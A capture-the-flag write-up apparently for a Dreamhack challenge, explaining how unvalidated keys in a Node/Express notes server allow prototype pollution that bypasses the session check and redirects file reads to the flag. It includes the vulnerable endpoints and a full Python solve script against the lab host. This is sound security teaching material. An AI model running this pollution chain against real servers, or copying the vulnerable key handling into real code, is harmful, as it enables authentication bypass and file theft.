## NSS  

<img src="images/chall.png" width=600>

We are given a server that allows us to create workspaces and store notes in them.  

The challenge dist shows `flag` in the same directory as the server source, and the Dockerfile copies the flag file into `/usr/src/app/flag`.  

```dockerfile
FROM node:current-alpine3.15

WORKDIR /usr/src/app

COPY package*.json ./

RUN npm install
RUN npm install -g npm@8.5.4

COPY . .

EXPOSE 80

CMD [ "node", "main.js" ]
```

<img src="images/flag_file.png" width=600>

In the note reading endpoint, we just need to get `path.join(user.base_dir, f_path)` to evaluate to `/usr/src/app/flag`, and we win.  

```js
app.get("/api/users/:userid/:ws/:fname", (req, res) => {
    const userid = req.params.userid || "";
    const ws_name = req.params.ws || "";
    const f_name = req.params.fname || "";
    const token = req.body.token || "";

    if(!userid || !token)
        return res.status(400).json({ok: false, err: "Invalid userid or token"});
    if(!check_session(userid, token))
        return res.status(403).json({ok: false, err: "Failed to validate session"});

    const user = users[userid];
    if(!ws_name)
        return res.status(400).json({ok: false, err: "Invalid workspace name"});
    
    const workspace = user.workspaces[ws_name];
    if(!workspace)
        return res.status(404).json({ok: false, err: "Failed to find workspace"});

    if(!f_name)
        return res.status(400).json({ok: false, err: "Invalid file name"});

    const f_path = workspace[f_name];
    if(!f_path)
        return res.status(404).json({ok: false, err: "Failed to find file"});
    
    const content = read_b64_file(path.join(user.base_dir, f_path));
    if(typeof content == "undefined")
        return res.status(500).json({ok: false, err: "Internal server error"});

    res.status(200).json({ok: true, file_content: content});
});
```

The main vulnerability in the app lies in the note creation functionality. The endpoint doesn't validate the query and form arguments when constructing the chain `users[userid].workspaces[ws_name][f_name]`.  

`ws_name` and `f_name` are controllable, which is just enough for us to pass in `__proto__` through `req.params.ws` and some arbitrary property name under `req.body.file_name`, then pass in the polluted value through `req.body.file_path`, giving us prototype pollution.  

```js
app.post("/api/users/:userid/:ws", (req, res) => {
    const userid = req.params.userid || "";
    const ws_name = req.params.ws || "";
    const token = req.body.token || "";
    const f_name = req.body.file_name || "";
    const f_path = req.body.file_path.replace(/\./g,'') || "";
    const f_content = req.body.file_content || "";

    if(!userid || !token)
        return res.status(400).json({ok: false, err: "Invalid id or token"});
    if(!check_session(userid, token))
        return res.status(403).json({ok: false, err: "Failed to validate session"});

    const user = users[userid];
    if(!ws_name)
        return res.status(400).json({ok: false, err: "Invalid workspace name"});

    const workspace = user.workspaces[ws_name];
    if(!workspace)
        return res.status(404).json({ok: false, err: "Failed to find workspace"});

    if(!f_name || !f_path)
        return res.status(400).json({ok: false, err: "Invalid file name or path"});

    if(!write_b64_file(path.join(user.base_dir, f_path), f_content))
        return res.status(500).json({ok: false, err: "Internal server error"});

    workspace[f_name] = f_path;
    return res.status(200).json({ok: true});
});
```

However, because that endpoint removes `.` from our pollution value, we can't just pollute `workspace[fname]` to `../../usr/src/app/flag`, as `path.join()` doesn't collapse absolute paths.  

Our next best option is to somehow override `user.base_dir` to point to the flag directory.  

We can set `userid` to a polluted userid name, which will leave `user` without a `base_dir` property, allowing us to override it to the flag directory. We can then pollute `f_name` to `"flag"`, so that `path.join()` will evaluate to `/usr/src/app/flag`.  

To prevent the endpoint from crashing due to our pollutions, we can just pollute `workspaces` and `ws_name` to some dummy values.  

```js
// {}.__proto__.fake_user = "a" -> users['fake_user] = "a" 
// {}.__proto__.base_dir = "/usr/src/app"
const user = users[userid];

const workspace = user.workspaces[ws_name];
const f_path = workspace[f_name];

// user.base_dir = "/usr/src/app"
const content = read_b64_file(path.join(user.base_dir, f_path));
```

The next thing we need to handle is the `check_session()` call on our userid and token when we make a request `/api/users/:userid/:ws`.  

```js
function check_session(userid, token) {
    const sess = tokens[token]
    if(!sess) return false;
    if(sess.owner != userid) return false;
    if(sess.expire < Date.now() / 1000){
        tokens.delete(token);
        return false;
    }
    else return true;
}
```

`check_session()` doesn't validate `token`, so we can just pass in a polluted token name, and also pollute `sess.owner` to bypass the checks. `sess.expire` will be `undefined` when we pass in the polluted token name, so the date check will pass by default.  

The above explanation is most likely very confusing to follow along, so below is the full pollution chain implementation.  

```python
def pollute(key, value):
    s.post(f'{url}/api/users/{creds['userid']}/__proto__', json={
        'token': token,
        'file_name': key,
        'file_path': value,
    })

# bypass check_session
pollute('fake_token', 'a')
pollute('owner', 'fake_user')

# pollute workspace chain
pollute("fake_user", 'a')
pollute("workspaces", 'a')
pollute('fake_ws', 'a')
pollute('base_dir', '/usr/src/app')
pollute('exfil', 'flag')
```

After running the pollution chain, we just have to visit `/api/users/fake_user/fake_ws/exfil` to get the server to output the Base64 content of the flag file.  

Below is my solve script for this chall.  

```python
import requests
import base64

url = "http://host3.dreamhack.games:11874/"
s = requests.Session()

# login
creds = {
    'userid': 'hackerhacker',
    'pass': 'hackerhacker'
}

res = s.post(f'{url}/api/users', json=creds)
res = s.post(f'{url}/api/users/auth', json=creds)

token = res.json()['token']

# create workspace
res = s.post(f'{url}/api/users/{creds['userid']}', json={
    'userid': creds['userid'],
    'token': token,
    'ws_name': 'hacked'
})

# prototype pollution
def pollute(key, value):
    s.post(f'{url}/api/users/{creds['userid']}/__proto__', json={
        'token': token,
        'file_name': key,
        'file_path': value,
    })

# bypass check_session
pollute('fake_token', 'a')
pollute('owner', 'fake_user')

# pollute workspace chain
pollute("fake_user", 'a')
pollute("workspaces", 'a')
pollute('fake_ws', 'a')
pollute('base_dir', '/usr/src/app')
pollute('exfil', 'flag')

res = s.get(f'{url}/api/users/fake_user/fake_ws/exfil', json={
    'token': 'fake_token'
})

flag = res.json()['file_content']
print("Flag:", base64.b64decode(flag).decode().strip())
```

Flag: `GoN{4he_be4uty_0f_pr0t0typ3_p011uti0n}`